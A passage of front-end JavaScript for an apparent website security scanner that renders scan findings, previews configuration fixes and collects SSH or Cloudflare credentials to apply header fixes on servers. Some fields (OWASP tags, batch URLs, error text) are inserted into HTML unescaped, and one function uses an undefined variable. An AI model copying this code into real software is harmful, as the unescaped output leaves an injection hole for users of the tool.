  html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: ' + (d.is_https ? '是' : '否') + ' · WAF: ' + wafText + ' · 风险等级: <strong style="color:' + color + '">' + (d.risk_level || '未知') + '</strong></div></div>';
  html += '<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:' + color + '">' + score + '</div>';
  html += '<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>';
  html += '</div>';
  // 缓存数据标注
  if (d.is_cached) {
    html += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">' + escapeHtml(d.note || '当前展示缓存扫描数据') + '</div>';
  }

  // 风险统计
  html += '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">';
  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">' + summary.high + '</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>';
  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">' + summary.medium + '</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>';
  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">' + summary.low + '</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>';
  html += '</div>';

  // 真实证据 1: 实际响应头
  html += '<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>';
  html += '<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">';
  presentHeaders.slice(0, 15).forEach(function(h) {
    let v = String(headers[h]);
    html += '<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">' + h + '</span>: <span class="response-header-value">' + escapeHtml(v) + '</span></div>';
  });
  if (presentHeaders.length > 15) html += '<div style="color:#64748b;margin-top:4px">... 还有 ' + (presentHeaders.length - 15) + ' 个</div>';
  html += '</div></details>';

  // 真实证据 2: 缺失安全头
  html += '<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（' + missingCritical.length + ' 个）</summary>';
  if (missingCritical.length === 0) {
    html += '<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>';
  } else {
    html += '<div style="margin-top:6px;padding:8px;font-size:12px">';
    missingCritical.forEach(function(h) { html += '缺失: ' + h + '<br>'; });
    html += '</div>';
  }
  html += '</details>';

  // 真实证据 3: 敏感路径探测
  html += '<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>';
  html += '<div style="margin-top:6px">' + sensitiveHtml + '</div></details>';

  // 详细问题列表
  if (findings.length > 0) {
    html += '<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（' + findings.length + ' 项）</summary>';
    html += '<div style="margin-top:6px;max-height:280px;overflow-y:auto">';
    findings.forEach(function(f) {
      let sevColor = f.severity === 'high' ? '#c75450' : f.severity === 'medium' ? '#f0a732' : '#4b6eaf';
      let sevText = f.severity === 'high' ? '高' : f.severity === 'medium' ? '中' : '低';
      // 兜底：fix 字段可能叫 recommendation
      let fixText = f.fix || f.recommendation || '';
      html += '<div data-finding-name="' + escapeHtml(f.name || '') + '" data-severity="' + (f.severity || 'low') + '" data-owasp="' + escapeHtml(f.owasp || '') + '" data-detail="' + escapeHtml(f.detail || '') + '" data-fix="' + escapeHtml(fixText) + '" style="padding:8px;margin-bottom:6px;border-left:3px solid ' + sevColor + ';background:var(--bg);border-radius:2px">';
      html += '<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">' + escapeHtml(f.name || '') + '</div>';
      html += '<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:' + sevColor + ';color:#fff">' + sevText + '</span>';
      // 优先级标签
      let priorityMap = { critical: 'P0', high: 'P1', medium: 'P2', low: 'P3' };
      let priority = priorityMap[f.severity] || 'P3';
      let priorityColors = { P0: '#c75450', P1: '#f0a732', P2: '#f0a732', P3: '#73c990' };
      html += '<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:' + priorityColors[priority] + ';font-weight:600;margin-left:6px;border:1px solid ' + priorityColors[priority] + '">' + priority + '</span></div>';
      // Vuln Sentinel: 代码层漏洞分类标签
      let codeVulnTypes = ['sqli', 'xss', 'csrf', 'ssti', 'open_redirect', 'cmdi', 'traversal', 'deserialization', 'ssrf', 'xxe', 'idor', 'info_leak'];
      let vulnType = String(f.type || '').toLowerCase();
      if (codeVulnTypes.indexOf(vulnType) >= 0) {
        html += '<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>';
      }
      if (f.owasp) html += '<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: ' + f.owasp + '</div>';
      if (f.detail) html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">' + escapeHtml(f.detail) + '</div>';
      if (f.recommendation) html += '<div style="font-size:12px;color:#73c990;margin-top:4px">建议：' + escapeHtml(f.recommendation) + '</div>';
      // 修复方法代码（Vuln Sentinel: 真实建议直接显示）
      if (fixText) {
        html += '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">建议</summary>';
        html += '<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + escapeHtml(fixText) + '</pre>';
        html += '</details>';
      }
      // Vuln Sentinel: 验证方法（增强版：显示三步验证法摘要）
      if (fixText) {
        if (f && f.verify_steps && f.verify_steps.length > 0) {
          html += '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>';
          html += '<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">';
          f.verify_steps.forEach(function(step, idx) {
            html += '<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">';
            html += '<div style="font-weight:600;color:var(--text-primary)">第' + (idx+1) + '步：' + escapeHtml(step.method || '') + '</div>';
            if (step.expect) {
              html += '<div style="color:var(--text-secondary);margin-top:2px">预期：' + escapeHtml(step.expect) + '</div>';
            }
            html += '</div>';
          });
          html += '</div></details>';
        } else {
          html += '<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：复测后重新扫描该网站，查看此项是否消失或评分是否提升。</div>';
        }
      }
      // 误报说明
      html += '<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项需要复测，可结合建议、响应证据和二次扫描结果综合判断。</div>';
      html += '</div>';
    });
    html += '</div></details>';
  }

  // Vuln Sentinel：完整建议摘要（6 平台 tab，登录后展示）
  if (d && d.fixes && Object.keys(d.fixes).length > 0) {
    let fixPlatforms2 = d.fixes;
    let platformNames2 = { nginx: 'Nginx', apache: 'Apache', express: 'Express', flask: 'Flask', spring_boot: 'Spring Boot', cloudflare: 'Cloudflare', python: 'Python', nodejs: 'Node.js' };
    let platformOrder2 = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare", "nodejs", "python"];
    let availableP2 = platformOrder2.filter(function(p) { return fixPlatforms2[p] && fixPlatforms2[p].length > 0 });
    if (availableP2.length > 0) {
      html += '<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">';
      html += '<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整建议（' + availableP2.length + ' 种平台）</div>';
      html += '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">';
      availableP2.forEach(function(p, i) {
        let active = i === 0;
        html += '<button onclick="switchPublicFixTab(\'' + p + '\')" id="pub-fix-tab-' + p + '" style="padding:4px 10px;border-radius:2px;border:1px solid ' + (active ? 'var(--success)' : 'var(--border)') + ';background:' + (active ? 'var(--success)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames2[p] + '</button>';
      });
      html += '</div>';
      availableP2.forEach(function(p, i) {
        let display = i === 0 ? 'block' : 'none';
        let items2 = fixPlatforms2[p];
        html += '<div id="pub-fix-pane-' + p + '" style="display:' + display + ';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">';
        items2.forEach(function(item, idx) {
          let code = (typeof item === 'string') ? item : (item && item.code ? item.code : String(item));
          html += '<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">';
          html += '<div style="color:#808080;font-size:11px;margin-bottom:2px"># ' + (idx+1) + '</div>';
          html += '<pre style="margin:0;white-space:pre-wrap;word-break:break-all">' + escapeHtml(code) + '</pre>';
          html += '</div>';
        });
        html += '</div>';
      });
      html += '</div>';
    }
  }

  // 操作按钮
  html += '<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">';
  html += '<button onclick="navigateTo(\'fixer\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用修复器生成补丁</button>';
  if (isLoggedIn()) {
    html += '<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>';
  } else {
    html += '<button onclick="navigateTo(\'profile\')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>';
  }
  html += '</div>';

  c.innerHTML = html;
}

// ----- switchPublicFixTab -----
function switchPublicFixTab(platform) {
  // 隐藏所有 pane
  document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(el) { el.style.display = 'none'; });
  // 显示选中的 pane
  let pane = document.getElementById('pub-fix-pane-' + platform);
  if (pane) pane.style.display = 'block';
  // 切换 tab 样式
  document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(btn) {
    btn.style.background = 'transparent';
    btn.style.color = 'var(--text-secondary)';
    btn.style.border = '1px solid var(--border)';
  });
  let tab = document.getElementById('pub-fix-tab-' + platform);
  if (tab) {
    tab.style.background = 'var(--success)';
    tab.style.color = '#fff';
    tab.style.border = '1px solid var(--success)';
  }
}

// ----- doPublicDemoFix -----
async function doPublicDemoFix() {
  // 从当前显示的报告里提取 findings
  let c = document.getElementById('public-report-content');
  if (!c) return;
  // 把当前扫描报告里所有 finding 名称都传给后端模拟修复
  let findings = [];
  c.querySelectorAll('[data-finding-name]').forEach(function(el) {
    findings.push({
      name: el.getAttribute('data-finding-name'),
      severity: el.getAttribute('data-severity') || 'low',
      owasp: el.getAttribute('data-owasp') || '',
      detail: el.getAttribute('data-detail') || '',
      fix: el.getAttribute('data-fix') || '',
    });
  });
  if (findings.length === 0) {
    showToast('没有发现需要修复的问题');
    return;
  }
  // 先调用后端把当前扫描保存为用户的扫描记录
  try {
    if (isLoggedIn() && window._lastScanId) {
      // 已经有 scan_id，不需要重新保存
    } else if (isLoggedIn()) {
      // 调用 /api/scan 把当前扫描报告保存为正式扫描记录
      let url = document.getElementById('public-report-host') ? document.getElementById('public-report-host').value : 'https://example.com';
      let sr = await authFetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: url, depth: 'standard', authorized: !!((document.getElementById('auth-check-step1') && document.getElementById('auth-check-step1').checked) || (document.getElementById('auth-check') && document.getElementById('auth-check').checked)) })
      });
      if (sr.ok) {
        let sd = await sr.json();
        window._lastScanId = sd.scan_id;
      }
    }
  } catch (e) {
    // 忽略保存失败，继续模拟修复
  }
  // 调用后端模拟修复
  try {
    let fixPayload = { findings: findings };
    // V11.4 fix: 传入 scan_id 以获取真实 before_score
    if (window._lastScanId) {
      fixPayload.scan_id = window._lastScanId;
    }
    let r = await authFetch('/api/simulate-fix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(fixPayload)
    });
    let data = await r.json();
    if (!r.ok) { showToast('生成修复配置失败'); return; }
    renderFixComparison(data);
  } catch (e) {
    showToast('网络错误：' + (e.message || e));
  }
}

// ----- renderFixComparison -----
function renderFixComparison(d) {
  try {
    let c = document.getElementById('public-report-content');
    if (!c) return;
    if (!d || typeof d !== 'object') {
      c.innerHTML = '<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';
      return;
    }
    let html = '';
  // 头部：返回
  html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">';
  html += '<h3 style="margin:0;font-size:16px">修复效果预览</h3>';
  html += '<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>';
  html += '</div>';
  // 总结
  html += '<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">';
  html += '<div style="font-size:14px;font-weight:600;color:#73c990">' + d.summary + '</div>';
  html += '</div>';
  // 评分对比
  html += '<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">';
  html += '<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">';
  html += '<div style="font-size:12px;color:var(--text-secondary)">复测前</div>';
  html += '<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">' + d.before_score + '</div>';
  html += '</div>';
  html += '<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>';
  html += '<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">';
  html += '<div style="font-size:12px;color:#73c990">复测后</div>';
  html += '<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">' + d.after_score + '</div>';
  html += '<div style="font-size:12px;color:#73c990;margin-top:2px">+ ' + d.delta + ' 分</div>';
  html += '</div>';
  html += '</div>';
  // 修复列表
  html += '<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（' + d.fixed_count + ' 项）</h4>';
  html += '<div style="max-height:300px;overflow-y:auto">';
  d.fixed_items.forEach(function(f, i) {
    let sevColor = f.severity === 'high' ? '#c75450' : f.severity === 'medium' ? '#f0a732' : '#4b6eaf';
    let sevText = f.severity === 'high' ? '高' : f.severity === 'medium' ? '中' : '低';
    html += '<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid ' + sevColor + '">';
    html += '<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">' + (i+1) + '.</div>';
    html += '<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">' + escapeHtml(f.name || '') + '</span>';
    html += '<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:' + sevColor + ';color:#fff">' + sevText + '</span>';
    if (f.owasp) html += '<span style="font-size:11px;color:#a5b4fc">' + escapeHtml(f.owasp) + '</span>';
    html += '</div>';
    if (f.fix) html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">' + escapeHtml(f.fix).substring(0, 200) + '</div>';
    html += '</div></div>';
  });
  html += '</div>';
  // 操作
  html += '<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">';
  if (isLoggedIn()) {
    html += '<button onclick="navigateTo(\'fixer\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>';
    // Vuln Sentinel 新增：自动修复按钮
    html += '<button onclick="showAutoFixDialog(\'' + (window._lastScanId || '') + '\', ' + (d.fixed_count || 0) + ')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>';
  } else {
    html += '<button onclick="navigateTo(\'profile\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>';
  }
  html += '</div>';
  c.innerHTML = html;
  } catch (e) {
    console.error('renderFixComparison error:', e);
    let c = document.getElementById('public-report-content');
    if (c) c.innerHTML = '<div class="card"><p style="color:var(--danger)">渲染修复对比失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
  }
}

// ----- showAutoFixDialog -----
function showAutoFixDialog(scanId, fixCount) {
  try {
  // 防止重复打开
  if (document.getElementById('auto-fix-dialog')) return;
  if (!scanId) {
    showToast('请先完成一次扫描');
    return;
  }
  let html = '';
  html += '<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">';
  html += '<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">';

  // 标题
  html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">';
  html += '<h3 style="margin:0;font-size:18px">生成修复配置 ' + fixCount + ' 项问题</h3>';
  html += '<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>';
  html += '</div>';

  // 说明
  html += '<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">';
  html += '<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>';
  html += '<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 验证头<br>';
  html += '<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>';
  html += '<b>零停机</b>：用 reload 而非 restart';
  html += '</div>';

  // 平台选择
  html += '<div style="margin-bottom:14px">';
  html += '<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>';
  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">';
  html += '<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">';
  html += '<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">';
  html += '<div style="font-size:20px;color:var(--text-secondary)">SSH</div>';
  html += '<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>';
  html += '<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>';
  html += '</label>';
  html += '<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">';
  html += '<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">';
  html += '<div style="font-size:20px;color:var(--text-secondary)">CF</div>';
  html += '<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>';
  html += '<div style="font-size:11px;color:var(--text-secondary)">只需 API 令牌</div>';
  html += '</label>';
  html += '</div>';
  html += '</div>';

  // SSH 表单
  html += '<div id="ssh-form">';
  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">';
  html += '<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '</div>';
  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">';
  html += '<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>';
  html += '</div>';
  html += '<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '</div>';

  // Cloudflare 表单（默认隐藏）
  html += '<div id="cf-form" style="display:none">';
  html += '<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API 令牌</label><input id="af-cf-token" type="password" placeholder="Cloudflare 令牌" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 example.com）</label><input id="af-cf-zone" type="text" placeholder="示例.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
  html += '</div>';

  // 确认按钮
  html += '<button onclick="executeAutoFix(\'' + scanId + '\')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置并复测</button>';

  // 结果区
  html += '<div id="af-result" style="margin-top:14px"></div>';

  html += '</div></div>';

  // 创建对话框
  let d = document.createElement('div');
  d.id = 'auto-fix-dialog';
  d.innerHTML = html;
  document.body.appendChild(d);

  // 切换表单
  setTimeout(function() {
    let radios = document.querySelectorAll('input[name="auto-fix-method"]');
    radios.forEach(function(r) {
      r.addEventListener('change', function() {
        let ssh = document.getElementById('ssh-form');
        let cf = document.getElementById('cf-form');
        let optSsh = document.getElementById('opt-ssh');
        let optCf = document.getElementById('opt-cf');
        if (this.value === 'ssh') {
          ssh.style.display = 'block';
          cf.style.display = 'none';
          optSsh.style.borderColor = 'var(--primary)';
          optCf.style.borderColor = 'var(--border)';
        } else {
          ssh.style.display = 'none';
          cf.style.display = 'block';
          optSsh.style.borderColor = 'var(--border)';
          optCf.style.borderColor = 'var(--primary)';
        }
      });
    });
  }, 50);
  } catch (e) {
    console.error('showAutoFixDialog error:', e);
    showToast('打开修复配置对话框失败: ' + (e.message || String(e)), 'error');
  }
}

// ----- closeAutoFixDialog -----
function closeAutoFixDialog() {
  let d = document.getElementById('auto-fix-dialog');
  if (d) d.remove();
}

// ----- executeAutoFix -----
async function executeAutoFix(scanId) {
  let methodRadio = document.querySelector('input[name="auto-fix-method"]:checked');
  if (!methodRadio) { showToast('请选择修复方式', 'error'); return; }
  let method = methodRadio.value;
  let result = document.getElementById('af-result');
  if (!result) return;
  result.innerHTML = '<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';

  try {
    let body = { scan_id: scanId };
    if (method === 'ssh') {
      body.credentials = {
        host: document.getElementById('af-host').value.trim(),
        port: parseInt(document.getElementById('af-port').value) || 22,
        username: document.getElementById('af-user').value.trim() || 'root',
        password: document.getElementById('af-pass').value,
        platform: document.getElementById('af-platform').value,
      };
      if (!body.credentials.host || !body.credentials.password) {
        result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';
        return;
      }
    } else {
      body.cf_token = document.getElementById('af-cf-token').value.trim();
      body.cf_zone = document.getElementById('af-cf-zone').value.trim();
      if (!body.cf_token || !body.cf_zone) {
        result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF 令牌 和 Zone</div>';
        return;
      }
    }

    let url = method === 'ssh' ? '/api/auto-fix' : '/api/auto-fix-via-cloudflare';
    let r = await authFetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    let data = await r.json();

    if (!r.ok || !data.success) {
      result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">' + escapeHtml(JSON.stringify(data, null, 2)) + '</pre></div>';
      return;
    }

    // 成功
    let html = '<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';
    html += '<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">修复成功</div>';
    if (data.host) html += '<div style="font-size:12px;color:var(--text-secondary)">服务器: ' + escapeHtml(data.host) + '</div>';
    if (data.config_path) html += '<div style="font-size:12px;color:var(--text-secondary)">配置: ' + escapeHtml(data.config_path) + ' (' + data.patch_size_bytes + ' 字节)</div>';
    if (data.config_test_ok !== undefined) {
      html += '<div style="font-size:12px;color:' + (data.config_test_ok ? '#73c990' : '#c75450') + '">nginx -t: ' + (data.config_test_ok ? '配置合法' : '配置错误，已停止 reload') + '</div>';
    }
    if (data.verified_headers && data.verified_headers.length > 0) {
      html += '<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>';
      data.verified_headers.slice(0, 6).forEach(function(h) {
        html += '<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">' + escapeHtml(h) + '</div>';
      });
    }
    if (data.applied !== undefined) {
      html += '<div style="font-size:12px;margin-top:8px">Cloudflare: ' + data.applied + '/' + data.total + ' 头已应用</div>';
    }
    html += '<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>';
    html += '</div>';
    result.innerHTML = html;
    showToast('修复配置已应用。已验证 ' + (data.verified_headers ? data.verified_headers.length : 0) + ' 个安全头');
  } catch (e) {
    result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: ' + escapeHtml(e.message || String(e)) + '</div>';
  }
}

// ----- showBatchScanModal,closeBatchScanModal,doBatchScan -----
function showBatchScanModal() {
  if (!isLoggedIn() && !isPublicDemoTarget(url)) { showToast('请先登录'); navigateTo('profile'); return; }
  let modal = document.getElementById('batch-scan-modal');
  if (modal) modal.style.display = 'flex';
  let res = document.getElementById('batch-results');
  if (res) res.innerHTML = '';
}
function closeBatchScanModal() {
  let modal = document.getElementById('batch-scan-modal');
  if (modal) modal.style.display = 'none';
}
async function doBatchScan() {
  let txt = (document.getElementById('batch-urls').value || '').trim();
  if (!txt) { showToast('请输入至少 1 个 URL'); return; }
  let urls = txt.split(/\r?\n/).map(function(s){return s.trim();}).filter(Boolean);
  if (urls.length > 5) { showToast('最多 5 个 URL'); return; }
  // 批量扫描授权确认检查
  let batchAuth = document.getElementById('batch-auth-check');
  if (!batchAuth || !batchAuth.checked) {
    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
    return;
  }
  let deepEl = document.getElementById('batch-deep');
  let deep = deepEl ? deepEl.checked : false;
  let btn = document.getElementById('batch-go-btn');
  if (btn) { btn.disabled = true; btn.textContent = '扫描中…'; }
  let res = document.getElementById('batch-results');
  if (!res) { if (btn) { btn.disabled = false; btn.textContent = '开始批量扫描'; } return; }
  res.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 ' + urls.length + ' 个目标…</div>';
  try {
    let r = await authFetch('/api/batch-scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ urls: urls, deep: deep, authorized: !!(batchAuth && batchAuth.checked) })
    });
    let data = await r.json();
    if (!r.ok) { res.innerHTML = '<div style="color:#c75450;padding:10px">错误：' + escapeHtml(friendlyError(extractError(data))) + '</div>'; return; }
    let html = '<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · ' + data.count + ' 个目标</div>';
    data.results.forEach(function(item, i) {
      let color = item.ok ? (item.score >= 80 ? '#73c990' : item.score >= 50 ? '#f0a732' : '#c75450') : '#808080';
      let bg = item.ok ? (item.score >= 80 ? 'rgba(16,185,129,0.1)' : item.score >= 50 ? 'rgba(240,167,50,0.1)' : 'rgba(199,84,80,0.1)') : 'rgba(156,163,175,0.1)';
      html += '<div style="background:' + bg + ';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">';
      html += '<div style="flex:1;min-width:0">';
      html += '<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + (i+1) + '. ' + item.url + '</div>';
      if (item.ok) {
        html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 ' + item.high + ' · 中 ' + item.medium + ' · 低 ' + item.low + '</div>';
      } else {
        html += '<div style="font-size:12px;color:#c75450;margin-top:3px">错误：' + (item.error || '失败') + '</div>';
